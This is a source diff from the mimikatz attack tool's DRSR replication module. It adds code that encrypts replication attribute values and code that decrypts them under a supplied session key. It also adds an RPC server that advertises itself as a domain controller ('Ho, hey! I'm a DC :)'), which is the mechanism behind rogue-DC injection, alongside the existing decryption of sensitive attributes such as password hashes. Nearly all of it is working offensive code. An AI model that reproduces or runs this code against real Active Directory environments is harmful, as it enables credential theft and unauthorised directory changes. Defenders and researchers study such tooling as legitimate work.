@@ -236,10 +236,10 @@ BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply(SCHEMA_PREFIX_TABLE *prefixTable, 
 					if(attSensitive[j] == pReplentinflist->Entinf.AttrBlock.pAttr[i].attrTyp)
 					{
 						if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal)
-						for(k = 0; k < pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.valCount; k++)
-							if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[k].pVal)
-								if(!kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt(&pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[k]))
-									return FALSE;
+							for(k = 0; k < pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.valCount; k++)
+								if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[k].pVal)
+									if(!kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt(&pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[k], NULL))
+										return FALSE;
 						break;
 					}
 				}
@@ -249,29 +249,26 @@ BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply(SCHEMA_PREFIX_TABLE *prefixTable, 
 	return TRUE;
 }
 
-BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt(ATTRVAL *val)
+BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt(ATTRVAL *val, SecPkgContext_SessionKey *SessionKey)
 {
 	BOOL status = FALSE;
-	PENCRYPTED_PAYLOAD encrypted;
+	PSecPkgContext_SessionKey pKey = SessionKey ? SessionKey : &kull_m_rpc_drsr_g_sKey;
+	PENCRYPTED_PAYLOAD encrypted = (PENCRYPTED_PAYLOAD) val->pVal;
 	MD5_CTX md5ctx;
-	CRYPTO_BUFFER cryptoKey = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, NULL}, cryptoData;
+	CRYPTO_BUFFER cryptoKey = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest}, cryptoData;
 	DWORD realLen, calcChecksum;
 	PVOID toFree;
 
-	if(kull_m_rpc_drsr_g_sKey.SessionKey && kull_m_rpc_drsr_g_sKey.SessionKeyLength)
+	if(pKey->SessionKey && pKey->SessionKeyLength)
 	{
 		if((val->valLen >= (ULONG) FIELD_OFFSET(ENCRYPTED_PAYLOAD, EncryptedData)) && val->pVal)
 		{
-			encrypted = (PENCRYPTED_PAYLOAD) val->pVal;
 			MD5Init(&md5ctx);
-			MD5Update(&md5ctx, kull_m_rpc_drsr_g_sKey.SessionKey, kull_m_rpc_drsr_g_sKey.SessionKeyLength);
+			MD5Update(&md5ctx, pKey->SessionKey, pKey->SessionKeyLength);
 			MD5Update(&md5ctx, encrypted->Salt, sizeof(encrypted->Salt));
 			MD5Final(&md5ctx);
-			cryptoKey.Buffer = md5ctx.digest;
-
 			cryptoData.Length = cryptoData.MaximumLength = val->valLen - FIELD_OFFSET(ENCRYPTED_PAYLOAD, CheckSum);
 			cryptoData.Buffer = (PBYTE) &encrypted->CheckSum;
-
 			if(NT_SUCCESS(RtlEncryptDecryptRC4(&cryptoData, &cryptoKey)))
 			{
 				realLen = val->valLen - FIELD_OFFSET(ENCRYPTED_PAYLOAD, EncryptedData);
@@ -293,6 +290,52 @@ BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt(ATTRVAL *val)
 				else PRINT_ERROR(L"Unable to calculate CRC32\n");
 			}
 			else PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
+		}
+		else PRINT_ERROR(L"No valid data\n");
+	}
+	else PRINT_ERROR(L"No Session Key\n");
+	return status;
+}
+
+BOOL kull_m_rpc_drsr_CreateGetNCChangesReply_encrypt(ATTRVAL *val, SecPkgContext_SessionKey *SessionKey)
+{
+	BOOL status = FALSE;
+	PSecPkgContext_SessionKey pKey = SessionKey ? SessionKey : &kull_m_rpc_drsr_g_sKey;
+	PENCRYPTED_PAYLOAD encrypted;
+	MD5_CTX md5ctx;
+	CRYPTO_BUFFER cryptoKey = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest}, cryptoData;
+	DWORD realLen = val->valLen + FIELD_OFFSET(ENCRYPTED_PAYLOAD, EncryptedData);
+	PVOID toFree;
+
+	if(pKey->SessionKey && pKey->SessionKeyLength)
+	{
+		if(val->valLen && val->pVal)
+		{
+			if(encrypted = (PENCRYPTED_PAYLOAD) MIDL_user_allocate(realLen))
+			{
+				toFree = encrypted;
+				RtlCopyMemory(encrypted->EncryptedData, val->pVal, val->valLen);
+				if(kull_m_crypto_hash(CALG_CRC32, encrypted->EncryptedData, val->valLen, &encrypted->CheckSum, sizeof(encrypted->CheckSum)))
+				{
+					CDGenerateRandomBits(encrypted->Salt, sizeof(encrypted->Salt));
+					MD5Init(&md5ctx);
+					MD5Update(&md5ctx, pKey->SessionKey, pKey->SessionKeyLength);
+					MD5Update(&md5ctx, encrypted->Salt, sizeof(encrypted->Salt));
+					MD5Final(&md5ctx);
+					cryptoData.Length = cryptoData.MaximumLength = realLen - FIELD_OFFSET(ENCRYPTED_PAYLOAD, CheckSum);
+					cryptoData.Buffer = (PBYTE) &encrypted->CheckSum;
+					if(NT_SUCCESS(RtlEncryptDecryptRC4(&cryptoData, &cryptoKey)))
+					{
+						toFree = val->pVal;
+						val->pVal = (PBYTE) encrypted;
+						val->valLen = realLen;
+						status = TRUE;
+					}
+					else PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
+				}
+				else PRINT_ERROR(L"Unable to calculate CRC32\n");
+				MIDL_user_free(toFree);
+			}
 		}
 		else PRINT_ERROR(L"No valid data\n");
 	}
@@ -474,7 +517,7 @@ BOOL kull_m_rpc_drsr_MakeAttid(SCHEMA_PREFIX_TABLE *prefixTable, LPCSTR szOid, A
 				oidPrefix.length -= (lastValue < 0x80) ? 1 : 2;
 				if(status = kull_m_rpc_drsr_MakeAttid_addPrefixToTable(prefixTable, &oidPrefix, &ndx, toAdd))
 					*att |= ndx << 16;
-				else PRINT_ERROR(L"kull_m_rpc_drsr_MakeAttid_addPrefixToTable");
+				else PRINT_ERROR(L"kull_m_rpc_drsr_MakeAttid_addPrefixToTable\n");
 				kull_m_asn1_freeEnc(oidPrefix.value);
 			}
 		}
@@ -535,3 +578,150 @@ void kull_m_rpc_drsr_findPrintMonoAttr(LPCWSTR prefix, SCHEMA_PREFIX_TABLE *pref
 	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOid, &ptr, &sz))
 		kprintf(L"%s%.*s%s", prefix ? prefix : L"", sz / sizeof(wchar_t), (PWSTR) ptr, newLine ? L"\n" : L"");
 }
+
+LPWSTR kull_m_rpc_drsr_MakeSpnWithGUID(LPCGUID ServClass, LPCWSTR ServName, LPCGUID InstName)
+{
+	LPWSTR result = NULL;
+	RPC_STATUS status;
+	RPC_WSTR szServClass, szInstName;
+	DWORD dwServClass, dwInstName, dwServName;
+	status = UuidToString(ServClass, &szServClass);
+	if(status == RPC_S_OK)
+	{
+		status = UuidToString(InstName, &szInstName);
+		if(status == RPC_S_OK)
+		{
+			dwServClass = lstrlen((LPWSTR) szServClass) * sizeof(wchar_t);
+			dwInstName = lstrlen((LPWSTR) szInstName) * sizeof(wchar_t);
+			dwServName = lstrlen(ServName) * sizeof(wchar_t);
+			if (result = (LPWSTR) LocalAlloc(LPTR, dwServClass + sizeof(wchar_t) + dwInstName + sizeof(wchar_t) + dwServName))
+			{
+				RtlCopyMemory(result, szServClass, dwServClass);
+				RtlCopyMemory((PBYTE) result + dwServClass + sizeof(wchar_t), szInstName, dwInstName);
+				((PBYTE) result)[dwServClass] = L'/';
+				RtlCopyMemory((PBYTE) result + dwServClass + sizeof(wchar_t) + dwServName + sizeof(wchar_t), ServName, dwServName);
+				((PBYTE) result)[dwServClass + sizeof(wchar_t) + dwServName] = L'/';
+			}
+			RpcStringFree(&szInstName);
+		}
+		else PRINT_ERROR(L"UuidToString(i): %08x\n", status);
+		RpcStringFree(&szServClass);
+	}
+	else PRINT_ERROR(L"UuidToString(s): %08x\n", status);
+	return result;
+}
+
+NTSTATUS kull_m_rpc_drsr_start_server(LPCWSTR ServName, LPCGUID InstName)
+{
+	RPC_STATUS status = 0;
+	RPC_BINDING_VECTOR *vector = NULL;
+	RPC_WSTR szUpn, bindString = NULL;
+	DWORD i;
+	BOOL toUnreg = FALSE;
+
+	if(szUpn = (RPC_WSTR) kull_m_rpc_drsr_MakeSpnWithGUID(&((RPC_SERVER_INTERFACE *) drsuapi_v4_0_s_ifspec)->InterfaceId.SyntaxGUID, ServName, InstName))
+	{
+		status = RpcServerUseProtseqEp((RPC_WSTR) L"ncacn_ip_tcp", RPC_C_PROTSEQ_MAX_REQS_DEFAULT, (RPC_WSTR) NULL, NULL);
+		if(status == RPC_S_OK)
+		{
+			status = RpcServerRegisterAuthInfo(szUpn, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, NULL);
+			if(status == RPC_S_OK)
+			{
+				status = RpcServerRegisterIf2(drsuapi_v4_0_s_ifspec, NULL, NULL, RPC_IF_ALLOW_SECURE_ONLY, RPC_C_LISTEN_MAX_CALLS_DEFAULT, -1, NULL);
+				if(status == RPC_S_OK)
+				{
+					status = RpcServerInqBindings(&vector);
+					if(status == RPC_S_OK)
+					{
+						for(i = 0; i < vector->Count; i++)
+						{
+							status = RpcBindingToStringBinding(vector->BindingH[i], &bindString);
+							if(status == RPC_S_OK)
+							{
+								kprintf(L" > BindString[%u]: %s\n", i, bindString);
+								RpcStringFree(&bindString);
+							}
+							else PRINT_ERROR(L"RpcBindingToStringBinding: %08x\n", status);
+						}
+
+						status = RpcEpRegister(drsuapi_v4_0_s_ifspec, vector, NULL, (RPC_WSTR) MIMIKATZ L" Ho, hey! I\'m a DC :)");
+						RpcBindingVectorFree(&vector);
+						if(status == RPC_S_OK)
+						{
+							kprintf(L" > RPC bind registered\n");
+							status = RpcServerListen(1, RPC_C_LISTEN_MAX_CALLS_DEFAULT, TRUE);
+							if(status == RPC_S_OK)
+								kprintf(L" > RPC Server is waiting!\n");
+							else if(status == RPC_S_ALREADY_LISTENING)
+							{
+								kprintf(L" > RPC Server already waiting!\n");
+								status = RPC_S_OK;
+							}
+							else PRINT_ERROR(L"RpcServerListen: %08x\n", status);
+						}
+						else PRINT_ERROR(L"RpcEpRegister: %08x\n", status);
+					}
+					else PRINT_ERROR(L"RpcServerInqBindings: %08x\n", status);
+				}
+				else PRINT_ERROR(L"RpcServerRegisterIf2: %08x\n", status);
+			}
+			else PRINT_ERROR(L"RpcServerRegisterAuthInfo: %08x\n", status);
+		}
+		else PRINT_ERROR(L"RpcServerUseProtseqEp: %08x\n", status);
+		LocalFree(szUpn);
+	}
+	return status;
+}
+
+NTSTATUS kull_m_rpc_drsr_stop_server()
+{
+	RPC_STATUS status;
+	RPC_BINDING_VECTOR *vector = NULL;
+
+	status = RpcServerInqBindings(&vector);
+	if(status == RPC_S_OK)
+	{
+		status = RpcEpUnregister(drsuapi_v4_0_s_ifspec, vector, NULL);
+		if(status == RPC_S_OK)
+			kprintf(L" > RPC bind unregistered\n");
+		else PRINT_ERROR(L"RpcEpUnregister: %08x\n", status);
+		RpcBindingVectorFree(&vector);
+	}
+	else PRINT_ERROR(L"RpcServerInqBindings: %08x\n", status);
+	status = RpcServerUnregisterIfEx(drsuapi_v4_0_s_ifspec, NULL, 1);
+	if(status != RPC_S_OK)
+		PRINT_ERROR(L"RpcServerUnregisterIf: %08x\n", status);
+	status = RpcMgmtStopServerListening(NULL);
+	if(status != RPC_S_OK)
+		PRINT_ERROR(L"RpcMgmtStopServerListening: %08x\n", status);
+	else
+	{
+		kprintf(L" > stopping RPC server\n");
+		RpcMgmtWaitServerListen();
+		kprintf(L" > RPC server stopped\n");
+	}
+	return status;
+}
+
+const PrefixTableEntry PrefixDefaultTableEntries[] = {
+	{0, {2 , (BYTE *) "\x55\x4"}},
+	{1, {2 , (BYTE *) "\x55\x6"}},
+	{2, {8 , (BYTE *) "\x2a\x86\x48\x86\xf7\x14\x01\x02"}},
+	{3, {8 , (BYTE *) "\x2a\x86\x48\x86\xf7\x14\x01\x03"}},
+	{4, {8 , (BYTE *) "\x60\x86\x48\x01\x65\x02\x02\x01"}},
+	{5, {8 , (BYTE *) "\x60\x86\x48\x01\x65\x02\x02\x03"}},
+	{6, {8 , (BYTE *) "\x60\x86\x48\x01\x65\x02\x01\x05"}},
+	{7, {8 , (BYTE *) "\x60\x86\x48\x01\x65\x02\x01\x04"}},
+	{8, {2 , (BYTE *) "\x55\x5"}},
+	{9, {8 , (BYTE *) "\x2a\x86\x48\x86\xf7\x14\x01\x04"}},
+	{10,{8 , (BYTE *) "\x2a\x86\x48\x86\xf7\x14\x01\x05"}},
+	{19,{8 , (BYTE *) "\x09\x92\x26\x89\x93\xf2\x2c\x64"}},
+	{20,{8 , (BYTE *) "\x60\x86\x48\x01\x86\xf8\x42\x03"}},
+	{21,{9 , (BYTE *) "\x09\x92\x26\x89\x93\xf2\x2c\x64\x01"}},
+	{22,{9 , (BYTE *) "\x60\x86\x48\x01\x86\xf8\x42\x03\x01"}},
+	{23,{10, (BYTE *) "\x2a\x86\x48\x86\xf7\x14\x01\x05\xb6\x58"}},
+	{24,{2 , (BYTE *) "\x55\x15"}},
+	{25,{2 , (BYTE *) "\x55\x12"}},
+	{26,{2 , (BYTE *) "\x55\x14"}},
+};
+const SCHEMA_PREFIX_TABLE SCHEMA_DEFAULT_PREFIX_TABLE = {ARRAYSIZE(PrefixDefaultTableEntries), (PrefixTableEntry *) PrefixDefaultTableEntries};
